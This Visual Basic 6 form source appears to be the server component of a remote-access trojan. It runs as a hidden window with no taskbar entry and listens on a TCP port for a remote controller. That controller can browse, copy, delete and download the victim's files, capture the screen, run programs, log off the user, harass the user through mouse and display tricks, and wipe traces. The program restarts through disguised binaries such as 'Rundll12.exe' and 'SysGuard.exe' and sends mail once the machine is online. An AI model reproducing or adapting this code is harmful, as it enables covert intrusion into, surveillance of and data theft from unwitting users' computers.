VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "mswinsck.ocx"
Begin VB.Form frmServer 
   BorderStyle     =   4  'Fixed ToolWindow
   Caption         =   "Server"
   ClientHeight    =   1665
   ClientLeft      =   45
   ClientTop       =   285
   ClientWidth     =   4695
   Icon            =   "frmServer.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   1665
   ScaleWidth      =   4695
   ShowInTaskbar   =   0   'False
   StartUpPosition =   2  'CenterScreen
   Visible         =   0   'False
   Begin VB.PictureBox Picture1 
      BorderStyle     =   0  'None
      Height          =   3735
      Left            =   120
      ScaleHeight     =   3735
      ScaleWidth      =   4575
      TabIndex        =   4
      Top             =   2040
      Width           =   4575
      Begin VB.TextBox Text1 
         Height          =   2175
         Left            =   0
         MultiLine       =   -1  'True
         ScrollBars      =   2  'Vertical
         TabIndex        =   10
         Top             =   360
         Width           =   4455
      End
      Begin VB.CommandButton cmdExit 
         Caption         =   "E&xit"
         Height          =   375
         Left            =   3720
         TabIndex        =   7
         Top             =   3240
         Width           =   735
      End
      Begin VB.CommandButton cmdSend 
         Caption         =   "&Send"
         Height          =   375
         Left            =   2880
         TabIndex        =   6
         Top             =   3240
         Width           =   735
      End
      Begin VB.TextBox Text2 
         Height          =   285
         Left            =   0
         TabIndex        =   5
         Top             =   2880
         Width           =   4455
      End
      Begin VB.Label Label3 
         AutoSize        =   -1  'True
         Caption         =   "Type here:"
         Height          =   195
         Left            =   120
         TabIndex        =   9
         Top             =   2640
         Width           =   765
      End
      Begin VB.Label Label2 
         AutoSize        =   -1  'True
         Caption         =   "Dialog:"
         Height          =   195
         Left            =   120
         TabIndex        =   8
         Top             =   120
         Width           =   495
      End
   End
   Begin VB.CommandButton Command2 
      Caption         =   "Cancel"
      Height          =   375
      Left            =   2400
      TabIndex        =   3
      Top             =   1200
      Width           =   855
   End
   Begin VB.CommandButton Command1 
      Caption         =   "OK"
      Height          =   375
      Left            =   1440
      TabIndex        =   2
      Top             =   1200
      Width           =   855
   End
   Begin VB.Timer Timer1 
      Enabled         =   0   'False
      Interval        =   1
      Left            =   1560
      Top             =   5520
   End
   Begin VB.Timer timMail 
      Interval        =   2000
      Left            =   840
      Top             =   5520
   End
   Begin MSWinsockLib.Winsock SMTP 
      Left            =   480
      Top             =   5520
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock tcpServer 
      Left            =   120
      Top             =   5520
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin VB.ListBox List1 
      Height          =   1620
      Left            =   120
      TabIndex        =   0
      Top             =   6000
      Width           =   4455
   End
   Begin VB.Image Image3 
      Height          =   480
      Left            =   3000
      Picture         =   "frmServer.frx":030A
      Top             =   5520
      Width           =   480
   End
   Begin VB.Image Image2 
      Height          =   480
      Left            =   2520
      Picture         =   "frmServer.frx":074C
      Top             =   5520
      Width           =   480
   End
   Begin VB.Image Image1 
      Height          =   480
      Left            =   2160
      Picture         =   "frmServer.frx":0B8E
      Top             =   5520
      Width           =   480
   End
   Begin VB.Image imgPic 
      Height          =   495
      Left            =   120
      Top             =   240
      Width           =   615
   End
   Begin VB.Label Label1 
      Caption         =   "Label1"
      Height          =   735
      Left            =   960
      TabIndex        =   1
      Top             =   240
      Width           =   3135
   End
End
Attribute VB_Name = "frmServer"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Option Explicit

Dim IsSetup As Boolean
Dim SendCnt As Integer

Private i As Integer

Private Sub CLOSE_Click()
Unload Me
End Sub


Private Sub cmdExit_Click()
   Me.Visible = False
   Me.Height = 1995
   Me.Caption = "Server"
   Picture1.Top = 5000
   Text2 = ""
   Text1 = ""
   SendData "Chat_Error_Msg,Chat terminated by other side."
   
End Sub

Private Sub cmdSend_Click()
    Text1 = Text1 & vbCrLf & LCase(Text2)
    SendData "Chat_Incoming," & Text2
       ScrollBox Text2, frmServer.Text1.Text
    Text2 = ""
End Sub

Private Sub Command2_Click()
   Me.Visible = False
   frmServer.Timer1.Enabled = False
   Me.Caption = "Server"
End Sub

Private Sub Form_Load()
   
   ' if already running; exit the program
   If App.PrevInstance Then End
   On Error GoTo Reconnect:
    ' make sure the reg is setup, and
    ' email is specified
    DoSetup
    'The socket to comunicate on
    
    tcpServer.LocalPort = Port
    'Set the socket to 'LISTEN' and wait for the server
    tcpServer.Listen
    'This next variable keeps track of if it's in a session or not
    bInConnection = False
    'Variable to state if the taskbar is visible or not
    bTaskBar = True
    
    VICAD False
    
    Exit Sub
    
Reconnect: ' trying to restart the server.... must do it on another port
   ' Port = Port + 1
    tcpServer.LocalPort = Port
    'Set the socket to 'LISTEN' and wait for the server
    tcpServer.Listen
    'This next variable keeps track of if it's in a session or not
    bInConnection = False
    'Variable to state if the taskbar is visible or not
    bTaskBar = True
    VICAD False
End Sub

Private Sub SMTP_DataArrival(ByVal bytesTotal As Long)
On Error Resume Next

    Dim datad As String
    SMTP.GetData datad, vbString
    LastSMTP = datad
End Sub



Private Sub tcpServer_Close()
    'Socket got a close call so close it if it's not already closed
    If tcpServer.State <> sckClosed Then tcpServer.Close
    'Call the form load event to reset all paramteres
    Form_Load
    
    m_Server.Connected = False
End Sub
Private Sub tcpServer_ConnectionRequest(ByVal requestID As Long)
    'A server is requesting a connection
    'If it's alread connected the don't continue.. ignore
    If bInConnection Then Exit Sub
    'If for some reason the socket is not close, close it
    If tcpServer.State <> sckClosed Then tcpServer.Close
    'Make the connection
    tcpServer.Accept requestID
    'Set the connection variable
    bInConnection = True
    SendData "Accept,"
    
    m_Server.Connected = True
        
End Sub
Private Sub tcpServer_DataArrival(ByVal bytesTotal As Long)

    ' Get all incoming commands here.
    Dim sIncoming As String
    Dim Drive As String
    Dim Command As String
    
    tcpServer.GetData sIncoming
        
    Command = EvalData(sIncoming, 1)
    Drive = EvalData(sIncoming, 2)
    
    Select Case Command
      Case "Monitor_Connected"
         bReplied = True
' FILE RELATED COMMANDS
    
      Case "Get_Users_Files"
          ClearArray Data, "Files"
          frmServer.List1.Clear
          m_Server.Get_Users_Files Drive
            
      Case "Gather_Dirs"
          frmServer.List1.Clear
          m_Server.GatherDirs Drive
      
      Case "Copy"
          m_Server.Copy Drive
      
      Case "Delete"
          m_Server.Delete Drive
    
      Case "Move"
          m_Server.Move Drive
          
      Case "Edit"
          m_Server.Edit Drive
          
      Case "Save"
          m_Server.Save Drive
                    
      Case "Search"
         m_Server.Search Drive
                  
      Case "Lock_Up"
         m_Server.LockUP Drive
         
      Case "Get_Owner_Info"
         m_Server.GetOwnerInfo
         
      Case "New_Email_Settings"
         m_Server.ChangeEmailSettings Drive
         
 ' SYSTEM RELATED COMMANDS
    
      Case "Get_Tasks"
          m_Server.LoadTaskList
          
      Case "Get_Pic_Paths"
          m_Server.GetPicPaths
    
      Case "Show_Picture"
          m_Server.ShowPic Drive
       
      Case "OpenCDROM"
          m_Server.OpenCDROM
          
      Case "Mouse"
          FunnyMouse
          
      Case "Swap_Mouse"
          m_Server.Swap
          
      
      Case "Reboot"
          Call ShutDown(ExitOptions.EWX_LOGOFF)
          
      Case "Disable_Mouse_KeyBoard"
      
      Case "Msg"
          m_Server.SendMsg Drive
      
      Case "Hide_TBar"
          m_Server.HideTBar
          
      Case "HangUp"
          m_Server.HangUp
        
          
      Case "Close_App"
          m_Server.CloseWindow Drive
          
      Case "ShutDown_Server"
          m_Server.ShutDown
          
      Case "Change_Resolution"
         m_Server.ChangeRes Drive
         
      Case "Get_Wave_Paths"
         m_Server.GetWavePaths
         
      Case "Play_WaveFile"
         m_Server.PlayWave Drive
         
      Case "Remove_Server_Traces"
         m_Server.RemoveServerTraces
         
      Case "Change_WallPaper"
         m_Server.ChangeWallpaper
         
      Case "FreezeMouse"
         m_Server.FreezeMouse
         
      Case "Get_Drives"
         m_Server.GetDrives
         
      Case "Capture_Screen"
        
        If Len(sIncoming) = 15 Then
          Call bSaveToFile("C:\TEMP1.OLD")
          Debug.Print "starting transmission"
          If Dir("C:\TEMP1.OLD", vbNormal) <> "" Then
             'Start Transamitting the file
             nFile = FreeFile
             Open "C:\TEMP1.OLD" For Binary As #nFile
             'Read a 4Kb buffer from the file.. I've found that
             'this is limited to the frame size of winsock. I believe
             'you can't make this any larger...
             sBuffer = Input(4196, nFile)
             'Send the data back to the server like so
             'grab:<size of chunck>:<actual data of file>
              SendData "Screen_Chunk," & Trim(Str(Len(sBuffer))) & ":" & sBuffer
           End If
        Else
           'Keep on transmitting the file
           'if the server doesn't respond with ok the terminate
           If Mid$(sIncoming, 16) <> "ok" Then
              'Stop sending the data : there was an error
               Close #nFile
           ElseIf EOF(nFile) Then
               'It's end-of-file so tel the server that
               SendData "Screen_Chunk,fin:"
               Close #nFile
               Exit Sub
           End If
           
           'Data ok so send next bit
           sBuffer = Input(4196, nFile)
           SendData "Screen_Chunk," & Trim(Str(Len(sBuffer))) & ":" & sBuffer
           
       End If
       
'// Call the Download method
       Case "DownLoad_This_"
       
         Dim Fname As String
         
         If (Mid(sIncoming, 16, 5) = "start") Then
           ' if the file exists start sending it to the client
           Fname = EvalData(sIncoming, 2)
           Fname = EvalData(Fname, 2, ";")
           If Dir(Fname, vbNormal) <> "" Then
              'Start Transamitting the file
              nfile2 = FreeFile
              Open Fname For Binary As #nfile2
              'Read a 4Kb buffer from the file.. I've found that
              'this is limited to the frame size of winsock. I believe
              'you can't make this any larger...
               sBuffer2 = Input(4196, nfile2)
              'Send the data back to the server like so
              'grab:<size of chunk>:<actual data of file>
               SendData "File_Chunk," & Trim(Str(Len(sBuffer2))) & ";" & sBuffer2
               
           End If
         Else
               'Keep on transmitting the file
               'if the server doesn't respond with ok then terminate
               If Mid$(sIncoming, 16) <> "ok" Then
                  'Stop sending the data : there was an error
                   Close #nfile2
                   SendData "Error_Msg,Problem sending data!"
               ElseIf EOF(nfile2) Then
                   'It's end-of-file so tel the server that
                   SendData "File_Chunk,fin;"
                   Close #nfile2
                   Exit Sub
               End If
           
               'Data ok so send next bit
               sBuffer2 = Input(4196, nfile2)
               SendData "File_Chunk," & Trim(Str(Len(sBuffer2))) & ";" & sBuffer2
     
         End If
           
'// Call the Upload method
       Case "UpLoading_This"
       
       
       Case "Get_SysInfo"
          m_Server.Get_SysInfo
          
       Case "YN_Msg"
          m_Server.YN_Msg Drive
          
       Case "Moving_Dialog"
          m_Server.MovingDialog Drive
          
       Case "Chat"
          m_Server.Chat Drive
          
       Case "In_Msg"
          m_Server.Chating Drive
       
       Case "Run"
          Dim bRunning As Boolean
          
          ' try to run the program
          bRunning = m_Server.Run(Drive)
          
          If bRunning Then ' success
             SendData "Error_Msg," & Drive & " executed successfully."
          Else             ' failed
             SendData "Error_Msg,The execution of " & Drive & " failed."
          End If
          
        Case "Rename"
           m_Server.Rename Drive
           
        Case "Write"
            WriteOnDT Drive
            
        Case "Restart_Server"
            Dim RestartPort As Integer
            
            RestartPort = Drive
            SendData "Server_path," & App.Path & "\SysGuard.exe"
            Pause 1500
                        
            ' start the restarter... at that port #
            CreateProc App.Path & "\Rundll12.exe", RestartPort
            
            ' close the connection
            tcpServer.Close
            ' then stop the server.
            m_Server.ShutDown
            
            ' let the re-starter do it's thing
        Case "Create_Dir"
            m_Server.CreateDir Drive
            
           
        Case Else
           SendData "Error_msg,I don't know what to do with that command!"
       
           
    End Select
    
    
End Sub

'--- Save the desktop to a file

Private Function bSaveToFile(ByVal sFilename As String) As Boolean
    Dim lString As String
    On Error GoTo Trap
    If Dir$(sFilename, vbNormal) <> "" Then Kill sFilename
    Call keybd_event(vbKeySnapshot, 1, 0, 0)
    
    SavePicture Clipboard.GetData(vbCFBitmap), sFilename
    bSaveToFile = True
    Exit Function
Trap:
    SendData "Error_msg,Error saving the screen capture on the host machine... try again in a few seconds... or restart the server first."
    Exit Function
    
End Function

Private Sub Command1_Mousemove(Button As Integer, Shift As Integer, X As Single, Y As Single)
    If Y < 200 Then
        Command1.Top = Command1.Top + 50
    End If

    If X < 200 Then
        Command1.Left = Command1.Left + 50
    End If

    If Y > 200 Then
        Command1.Top = Command1.Top - 50
    End If

    If X > 200 Then
        Command1.Left = Command1.Left - 50
    End If
End Sub


Private Sub tcpServer_Error(ByVal Number As Integer, Description As String, ByVal Scode As Long, ByVal Source As String, ByVal HelpFile As String, ByVal HelpContext As Long, CancelDisplay As Boolean)
      SendData "Error_Msg,ERROR#" & Number & "   " & Description
End Sub

Private Sub Timer1_Timer()
    
If Command1.Top > 1300 Then
Command1.Top = 10
End If
If Command1.Top < 10 Then
Command1.Top = 1300
End If
If Command1.Left > 3000 Then
Command1.Left = 10
End If
If Command1.Left < 10 Then
Command1.Left = 3000
End If

End Sub

Private Sub timMail_Timer()
    Static NoCnct_cntr As Integer
    
    ' check for an internet connection
    IsSetup = IsConnected()
    
    If IsSetup Then
      SendCnt = SendCnt + 1
      
      ' only allow mail to be sent once
      ' each time the user logs on
      If SendCnt = 1 Then
        ' initialize the mailing process
        InitMail
        
        ' reset the no connection counter since it won't
        ' be connected again after this connection
        NoCnct_cntr = 0
      End If
      
      ' don't let send \cnt get to big
      If SendCnt > 100 Then
        ' don't let it = 1 again
        SendCnt = 2
      End If
    ElseIf (Not IsSetup) Then
      SendCnt = 0
      
      ' there is not an internet connection
      ' check to see if any sysattack option have been
      ' selected
      ' only do this once
      NoCnct_cntr = NoCnct_cntr + 1
      
      If NoCnct_cntr = 1 Then
        CheckSysAttOptions
      End If
      
      ' don't let NoCnct_cntr get to big
      If NoCnct_cntr > 100 Then
        ' don't let it = 1 again
        NoCnct_cntr = 2
      End If
    End If
       
End Sub




